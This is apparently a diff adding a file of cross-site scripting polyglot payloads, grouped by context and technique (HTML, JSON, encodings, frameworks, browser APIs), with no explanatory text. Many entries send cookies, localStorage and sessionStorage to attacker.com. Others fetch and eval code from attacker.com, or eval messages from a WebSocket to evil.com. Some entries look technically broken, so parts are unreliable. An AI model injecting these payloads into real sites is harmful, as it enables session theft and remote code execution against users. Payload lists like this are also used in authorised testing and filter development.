@@ -1,0 +1,539 @@
+# HTML/JavaScript/SVG Polyglots
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//>"
+
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert(1)//>"
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+
+# SQL/XSS Polyglots
+'+alert(1)+'
+"+alert(1)+"
+</script><script>alert(1)</script>
+'</script><script>alert(1)</script>
+"></script><script>alert(1)</script>
+`+alert(1)+`
+'+alert(1)//\
+"+alert(1)//\
+`+alert(1)//\
+
+# XML/XSS Polyglots
+<xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
+<?import namespace="t" implementation="#default#time2">
+<t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;">
+
+# JSON/JavaScript/XSS Polyglots
+{"key":"value","onload":"alert(1)"}
+{
+    "key": "</script><script>alert(1)</script>",
+    "another_key": "*/alert(1)}//",
+    "yet_another": "'-alert(1)-'"
+}
+
+# Advanced Polyglot Payloads
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=fetch('//attacker.com/steal?c='+document.cookie)//>"
+
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=fetch('//attacker.com/steal?d='+document.domain)//>"
+
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=fetch('//attacker.com/steal?l='+localStorage.getItem('sensitive_data'))//>"
+
+# Context-Breaking Polyglots
+-->'"/></title></textarea></style></noscript></noembed></template></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
+-->'"/></title></textarea></style></noscript></noembed></template></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+fetch('//attacker.com/steal?c='+document.cookie)//'>
+
+# Data URI Polyglots
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:application/x-javascript,alert(1)
+data:text/html;charset=utf-8,<script>alert(1)</script>
+data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# Event Handler Polyglots
+onload=alert(1)//"/onload="/*
+onload=fetch('//attacker.com/steal?c='+document.cookie)//"/onload="/*
+onmouseover=alert(1)//"/onmouseover="/*
+onerror=alert(1)//"/onerror="/*
+onmouseover=fetch('//attacker.com/steal?c='+document.cookie)//"/onmouseover="/*
+
+# Encoding-Based Polyglots
+&#x3C;svg/onload&#x3D;alert(1)&#x3E;
+&#x3C;svg/onload&#x3D;fetch('//attacker.com/steal?c='&#x2B;document.cookie)&#x3E;
+%3Csvg/onload%3Dalert(1)%3E
+%3Csvg/onload%3Dfetch(%27//attacker.com/steal?c=%27%2Bdocument.cookie)%3E
+
+# Protocol-Based Polyglots
+javascript:alert(1)/*http://trusted.com
+javascript:fetch('//attacker.com/steal?c='+document.cookie)/*http://trusted.com
+javascript:alert(1)//http://trusted.com
+javascript:fetch('//attacker.com/steal?c='+document.cookie)//http://trusted.com
+
+# Comment-Based Polyglots
+<!--><script>alert(1)//--></script>
+<!--><script>fetch('//attacker.com/steal?c='+document.cookie)//--></script>
+<!--><img src=x onerror=alert(1)//-->
+<!--><img src=x onerror=fetch('//attacker.com/steal?c='+document.cookie)//-->
+
+# Mixed Context Polyglots
+"onmouseover="alert(1)"style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999999"<!--
+--><script>alert(1)</script><!--
+--><img src=x onerror=alert(1)><!--
+--><svg/onload=alert(1)><!--
+
+# Advanced Storage-Based Polyglots
+"onload="(async()=>{localStorage.setItem('xss',await fetch('//attacker.com').then(r=>r.text()));eval(localStorage.getItem('xss'))})()
+
+"onload="(async()=>{sessionStorage.setItem('xss',await fetch('//attacker.com').then(r=>r.text()));eval(sessionStorage.getItem('xss'))})()
+
+# Framework-Specific Polyglots
+{{constructor.constructor('alert(1)')()}}<!--"><script>eval(localStorage.getItem('xss'))</script>
+{{$on.constructor('alert(1)')()}}<!--"><script>eval(sessionStorage.getItem('xss'))</script>
+[innerHTML]="<img src=x onerror=alert(1)>"<!--"><script>alert(1)</script>
+<div v-html="'<img src=x onerror=alert(1)>'"></div><!--"><script>alert(1)</script>
+
+# Multi-Context Polyglots
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=(async()=>{await fetch('//attacker.com/steal',{method:'POST',body:JSON.stringify({cookies:document.cookie,localStorage:localStorage,sessionStorage:sessionStorage})})})()//>"
+
+# Mutation-Based Polyglots
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+
+# Mixed Encoding Polyglots
+&#x3C;img src=x onerror=alert(1)&#x3E;
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+\x3Cimg\x20src\x3Dx\x20onerror\x3Dalert(1)\x3E
+\u003Cimg\u0020src\u003Dx\u0020onerror\u003Dalert(1)\u003E 
+
+# Advanced Multi-Context Polyglots
+javascript:"/*\`/*'/*\"/*--></noscript></title></textarea></style></template></noembed></script><html><script>
+  new Function`al\ert\`1\``;
+  [1].map(alert);
+  eval.call`${'alert\x281)'}`
+</script><script>
+  (()=>{
+    location=`javas\x63ript\x3aalert\x28document.domain\x29`;
+    history.pushState('','',`javas\x63ript\x3aalert\x28document.cookie\x29`);
+    sessionStorage.setItem('xss',`<img src=x onerror=alert(1)>`);
+    localStorage.setItem('xss',`<svg onload=alert(1)>`);
+  })()
+</script>//>"
+
+# Advanced Storage + DOM + API Polyglot
+javascript:"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html><script>
+  (async()=>{
+    // Storage attacks
+    localStorage.setItem('xss','<svg onload=alert(1)>');
+    sessionStorage.setItem('xss','<img src=x onerror=alert(1)>');
+    
+    // DOM manipulation
+    document.body.innerHTML = localStorage.getItem('xss');
+    document.write(sessionStorage.getItem('xss'));
+    
+    // API abuse
+    navigator.serviceWorker.register('javascript:alert(1)');
+    navigator.sendBeacon('javascript:alert(1)');
+    
+    // IndexedDB exploitation
+    let db = await indexedDB.open('xss');
+    db.onsuccess = e => e.target.result.createObjectStore('store').add('alert(1)','key');
+    
+    // WebSocket + EventSource combo
+    new WebSocket('javascript:alert(1)');
+    new EventSource('javascript:alert(1)');
+    
+    // Worker exploitation
+    new Worker(URL.createObjectURL(new Blob(['alert(1)'])));
+    
+    // Notification API
+    Notification.requestPermission().then(() => new Notification('XSS'));
+  })()
+</script>//>"
+
+# Advanced Framework Bypass Polyglot
+javascript:"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html>
+<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
+<div ng-app>{{$eval('alert(1)')}}</div>
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}></div>
+<div innerHTML='<img src=x onerror=alert(1)>'></div>
+{{constructor.constructor('alert(1)')()}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)')}}//>"
+
+# Advanced Protocol Handler Polyglot
+javascript:/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+vbscript:alert(1)
+view-source:javascript:alert(1)
+jar:javascript:alert(1)
+java:javascript:alert(1)
+mailto:javascript:alert(1)
+tel:javascript:alert(1)
+sms:javascript:alert(1)
+news:javascript:alert(1)
+feed:javascript:alert(1)
+mocha:javascript:alert(1)
+livescript:javascript:alert(1)
+blob:javascript:alert(1)
+data:javascript:alert(1)
+
+# Advanced Encoding Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+eval(atob('YWxlcnQoMSk='))//'>
+&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029
+%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x31\x29
+
+# Advanced Event Handler Polyglot
+"onmouseover="alert(1)" onmouseout="alert(2)" onclick="alert(3)" ondblclick="alert(4)" onmousedown="alert(5)" onmouseup="alert(6)" onkeydown="alert(7)" onkeypress="alert(8)" onkeyup="alert(9)" onfocus="alert(10)" onblur="alert(11)" onsubmit="alert(12)" onreset="alert(13)" onselect="alert(14)" onchange="alert(15)" onload="alert(16)" onunload="alert(17)" onerror="alert(18)" onabort="alert(19)" oncontextmenu="alert(20)" oncopy="alert(21)" oncut="alert(22)" onpaste="alert(23)" ondrag="alert(24)" ondragend="alert(25)" ondragenter="alert(26)" ondragleave="alert(27)" ondragover="alert(28)" ondragstart="alert(29)" ondrop="alert(30)" onscroll="alert(31)" onwheel="alert(32)" ontouchstart="alert(33)" ontouchmove="alert(34)" ontouchend="alert(35)" onplay="alert(36)" onpause="alert(37)" onplaying="alert(38)" onprogress="alert(39)" onratechange="alert(40)" onseeked="alert(41)" onseeking="alert(42)" onstalled="alert(43)" onsuspend="alert(44)" ontimeupdate="alert(45)" onvolumechange="alert(46)" onwaiting="alert(47)" onshow="alert(48)" ontoggle="alert(49)" onclose="alert(50)"
+
+# Advanced CSS Injection Polyglot
+<style>
+@import 'javascript:alert(1)';
+@import url('javascript:alert(1)');
+background-image: url('javascript:alert(1)');
+list-style-image: url('javascript:alert(1)');
+content: url('javascript:alert(1)');
+cursor: url('javascript:alert(1)');
+border-image: url('javascript:alert(1)');
+behavior: url('javascript:alert(1)');
+-moz-binding: url('javascript:alert(1)');
+</style>
+
+# Advanced Character Encoding Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+eval(String.fromCharCode(97,108,101,114,116,40,49,41))//'>
+&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
+&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;
+\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029
+\x61\x6C\x65\x72\x74\x28\x31\x29
+
+# Advanced Mixed Encoding Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+eval(decodeURIComponent(escape(atob('YWxlcnQoMSk='))))//'>
+&#x3C;&#x69;&#x6D;&#x67;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x78;&#x20;&#x6F;&#x6E;&#x65;&#x72;&#x72;&#x6F;&#x72;&#x3D;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3E;
+%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%31%29%3E
+\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0078\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E
+
+# Advanced Browser API Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(async()=>{
+  await navigator.clipboard.writeText('alert(1)');
+  await navigator.clipboard.readText().then(eval);
+  navigator.vibrate([100,30,100,30,100,30]);
+  navigator.getBattery().then(b=>b.addEventListener('levelchange',()=>alert(1)));
+  navigator.connection.addEventListener('change',()=>alert(1));
+  navigator.geolocation.getCurrentPosition(()=>alert(1));
+  navigator.mediaDevices.getUserMedia({audio:true}).then(()=>alert(1));
+  navigator.serviceWorker.register('javascript:alert(1)');
+  navigator.sendBeacon('javascript:alert(1)');
+})()//'>
+
+# Advanced DOM Manipulation Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(()=>{
+  document.body.innerHTML='<img src=x onerror=alert(1)>';
+  document.write('<script>alert(1)</script>');
+  document.writeln('<script>alert(1)</script>');
+  document.execCommand('insertHTML',false,'<img src=x onerror=alert(1)>');
+  document.designMode='on';
+  document.execCommand('insertHTML',false,'<img src=x onerror=alert(1)>');
+  document.implementation.createHTMLDocument().write('<script>alert(1)</script>');
+  new DOMParser().parseFromString('<script>alert(1)</script>','text/html');
+})()//'>
+
+# Advanced Storage Manipulation Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(async()=>{
+  localStorage.setItem('xss','<img src=x onerror=alert(1)>');
+  sessionStorage.setItem('xss','<svg onload=alert(1)>');
+  document.cookie='xss=<script>alert(1)</script>';
+  indexedDB.open('xss').onsuccess=e=>e.target.result.createObjectStore('store').add('alert(1)','key');
+  caches.open('xss').then(c=>c.put('/',new Response('<script>alert(1)</script>')));
+})()//'>
+
+# Advanced WebWorker Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(()=>{
+  new Worker(URL.createObjectURL(new Blob(['alert(1)'])));
+  new SharedWorker(URL.createObjectURL(new Blob(['alert(1)'])));
+  navigator.serviceWorker.register(URL.createObjectURL(new Blob(['alert(1)'])));
+})()//'>
+
+# Advanced WebSocket + EventSource Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(()=>{
+  new WebSocket('javascript:alert(1)');
+  new EventSource('javascript:alert(1)');
+  new WebSocket('wss://evil.com').onmessage=e=>eval(e.data);
+  new EventSource('data:,alert(1)');
+})()//'>
+
+# Advanced Mutation Observer Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(()=>{
+  new MutationObserver(m=>m.forEach(m=>m.addedNodes.forEach(n=>n.nodeType===1&&eval('alert(1)')))).observe(document,{childList:true,subtree:true});
+  new IntersectionObserver(e=>e.forEach(e=>e.isIntersecting&&eval('alert(1)'))).observe(document.body);
+  new ResizeObserver(e=>e.forEach(e=>eval('alert(1)'))).observe(document.body);
+  new PerformanceObserver(e=>e.getEntries().forEach(e=>eval('alert(1)'))).observe({entryTypes:['resource']});
+})()//'>
+
+# Advanced Error Handling Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(()=>{
+  window.onerror=alert;
+  window.onunhandledrejection=e=>alert(e.reason);
+  throw new Error('1');
+  Promise.reject('1');
+  new Promise(r=>r(alert(1)));
+  new Error().toString.call.call(alert,1);
+})()//'>
+
+# Advanced Timing Attack Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(()=>{
+  setTimeout('alert(1)',0);
+  setInterval('alert(1)',1000);
+  requestAnimationFrame(()=>alert(1));
+  requestIdleCallback(()=>alert(1));
+  setImmediate(()=>alert(1));
+  process.nextTick(()=>alert(1));
+})()//'>
+
+# Advanced Module Import Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(async()=>{
+  await import('data:text/javascript,alert(1)');
+  await import('javascript:alert(1)');
+  import('data:text/javascript,alert(1)').then(eval);
+  import('javascript:alert(1)').then(eval);
+})()//'>
+
+# Advanced Template Literal Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(()=>{
+  alert`1`;
+  (alert)`1`;
+  `${alert(1)}`;
+  `${eval('alert(1)')}`;
+  String.raw`${alert(1)}`;
+  new Function`alert\`1\``;
+})()//'>
+
+# Advanced Proxy Object Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(()=>{
+  new Proxy({},{
+    get:()=>alert(1),
+    set:()=>alert(1),
+    has:()=>alert(1),
+    deleteProperty:()=>alert(1),
+    apply:()=>alert(1),
+    construct:()=>alert(1),
+    defineProperty:()=>alert(1),
+    getOwnPropertyDescriptor:()=>alert(1),
+    getPrototypeOf:()=>alert(1),
+    setPrototypeOf:()=>alert(1),
+    isExtensible:()=>alert(1),
+    preventExtensions:()=>alert(1),
+    ownKeys:()=>alert(1)
+  });
+})()//'>
+
+# Advanced Symbol Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(()=>{
+  Symbol('alert(1)').toString.call.call(alert,1);
+  Symbol.for('alert(1)').toString.call.call(alert,1);
+  Symbol.keyFor(Symbol.for('alert(1)')).toString.call.call(alert,1);
+})()//'>
+
+# Advanced Regular Expression Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(()=>{
+  /alert(1)/.source.sub(/.*/, eval);
+  RegExp('alert(1)').source.sub(/.*/, eval);
+  'alert(1)'.match(/.*/).toString.call.call(alert,1);
+})()//'>
+
+# Advanced Generator Function Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(()=>{
+  function* x(){yield alert(1)}
+  x().next();
+  (function*(){yield alert(1)})().next();
+  (async function*(){yield await Promise.resolve(alert(1))})().next();
+})()//'>
+
+# Advanced Async/Await Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(async()=>{
+  await Promise.resolve(alert(1));
+  await eval('alert(1)');
+  await new Promise(r=>r(alert(1)));
+  await (async()=>alert(1))();
+})()//'>
+
+# Advanced Browser Extension Communication Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(()=>{
+  window.postMessage({type:'extension',eval:'alert(1)'},'*');
+  chrome.runtime.sendMessage({eval:'alert(1)'});
+  browser.runtime.sendMessage({eval:'alert(1)'});
+  safari.extension.dispatchMessage('alert(1)');
+})()//'>
+
+# Advanced CSS Animation Polyglot
+javascript:"/*--></title></style></template></noembed></script><style>
+@keyframes x{from{background:url('javascript:alert(1)')}to{background:url('javascript:alert(2)')}}
+@-webkit-keyframes x{from{background:url('javascript:alert(1)')}to{background:url('javascript:alert(2)')}}
+@-moz-keyframes x{from{background:url('javascript:alert(1)')}to{background:url('javascript:alert(2)')}}
+@-ms-keyframes x{from{background:url('javascript:alert(1)')}to{background:url('javascript:alert(2)')}}
+@-o-keyframes x{from{background:url('javascript:alert(1)')}to{background:url('javascript:alert(2)')}}
+</style><div style="animation:x 1s infinite">
+
+# Advanced SVG Animation Polyglot
+javascript:"/*--></title></style></template></noembed></script><svg>
+<animate onbegin=alert(1) attributeName=x dur=1s>
+<animate onend=alert(1) attributeName=x dur=1s>
+<animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2>
+<set onbegin=alert(1) attributeName=x>
+<set onend=alert(1) attributeName=x>
+<animatetransform onbegin=alert(1) attributeName=transform>
+<animatemotion onbegin=alert(1) path="M0,0 L100,100">
+</svg>
+
+# Advanced Meta Tag Polyglot
+javascript:"/*--></title></style></template></noembed></script>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="refresh" content="0;data:text/html,<script>alert(1)</script>">
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&AH4&AH4>
+<meta name="msapplication-notification" content='<script>alert(1)</script>'>
+
+# Advanced Frame Manipulation Polyglot
+javascript:"/*--></title></style></template></noembed></script>
+<iframe src="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe src="data:text/html,<script>alert(1)</script>">
+<embed src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<applet code="javascript:alert(1)">
+<frame src="javascript:alert(1)">
+<frameset onload=alert(1)>
+</frameset>
+
+# Advanced Event Handler Stacking Polyglot
+javascript:"/*--></title></style></template></noembed></script>
+<img src=x 
+  onerror="alert(1)" 
+  onload="alert(2)" 
+  oninput="alert(3)" 
+  onmouseover="alert(4)" 
+  onfocus="alert(5)" 
+  onblur="alert(6)" 
+  onchange="alert(7)" 
+  onclick="alert(8)" 
+  ondblclick="alert(9)" 
+  onkeydown="alert(10)" 
+  onkeypress="alert(11)" 
+  onkeyup="alert(12)" 
+  onmousedown="alert(13)" 
+  onmousemove="alert(14)" 
+  onmouseout="alert(15)" 
+  onmouseover="alert(16)" 
+  onmouseup="alert(17)"
+  oncontextmenu="alert(18)"
+  ondrag="alert(19)"
+  ondragend="alert(20)"
+  ondragenter="alert(21)"
+  ondragleave="alert(22)"
+  ondragover="alert(23)"
+  ondragstart="alert(24)"
+  ondrop="alert(25)"
+  onscroll="alert(26)"
+  onwheel="alert(27)"
+  ontouchstart="alert(28)"
+  ontouchmove="alert(29)"
+  ontouchend="alert(30)"
+  onplay="alert(31)"
+  onpause="alert(32)"
+  onplaying="alert(33)"
+  onprogress="alert(34)"
+  onratechange="alert(35)"
+  onseeked="alert(36)"
+  onseeking="alert(37)"
+  onstalled="alert(38)"
+  onsuspend="alert(39)"
+  ontimeupdate="alert(40)"
+  onvolumechange="alert(41)"
+  onwaiting="alert(42)"
+  onshow="alert(43)"
+  ontoggle="alert(44)"
+  onclose="alert(45)">
+
+# Advanced Recursive Execution Polyglot
+javascript:"/*--></title></style></template></noembed></script>
+<script>
+(function x() {
+  alert(1);
+  setTimeout(x, 1000);
+})();
+
+(function y() {
+  alert(2);
+  requestAnimationFrame(y);
+})();
+
+(async function z() {
+  alert(3);
+  await new Promise(r => setTimeout(r, 1000));
+  z();
+})();
+</script>
+
+# Advanced Error-Based Execution Polyglot
+javascript:"/*--></title></style></template></noembed></script>
+<script>
+window.onerror = alert;
+window.onunhandledrejection = e => alert(e.reason);
+throw 1;
+Promise.reject(2);
+new Promise((r,j) => j(3));
+</script>
+
+# Advanced Promise-Based Execution Polyglot
+javascript:"/*--></title></style></template></noembed></script>
+<script>
+Promise.reject(alert(1));
+new Promise(r => r(alert(2)));
+Promise.all([Promise.resolve(alert(3))]);
+Promise.race([Promise.resolve(alert(4))]);
+Promise.any([Promise.resolve(alert(5))]);
+Promise.allSettled([Promise.resolve(alert(6))]);
+</script>
+
+# Advanced Proxy-Based Execution Polyglot
+javascript:"/*--></title></style></template></noembed></script>
+<script>
+new Proxy({}, {
+  get: () => alert(1),
+  set: () => alert(2),
+  has: () => alert(3),
+  deleteProperty: () => alert(4),
+  apply: () => alert(5),
+  construct: () => alert(6),
+  defineProperty: () => alert(7),
+  getOwnPropertyDescriptor: () => alert(8),
+  getPrototypeOf: () => alert(9),
+  setPrototypeOf: () => alert(10),
+  isExtensible: () => alert(11),
+  preventExtensions: () => alert(12),
+  ownKeys: () => alert(13)
+});
+</script> 
+
+# Advanced Polyglot Payloads
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(()=>{
+  eval(atob('YWxlcnQoMSk='));
+  new Function('alert(1)')();
+  document.body.innerHTML = `<img src=x onerror=alert(1)>`;
+})()//'>
+
+# Advanced CSS Injection Polyglot
+<style>
+@import 'javascript:alert(1)';
+background-image: url('javascript:alert(1)');
+list-style-image: url('javascript:alert(1)');
+</style>
+
+# Advanced WebSocket + EventSource Polyglot
+new WebSocket('wss://evil.com').onmessage = e => eval(e.data);
+new EventSource('data:,alert(1)');
+
+# Advanced Async/Await Polyglot
+(async () => {
+  await Promise.resolve(alert(1));
+  await eval('alert(1)');
+})();
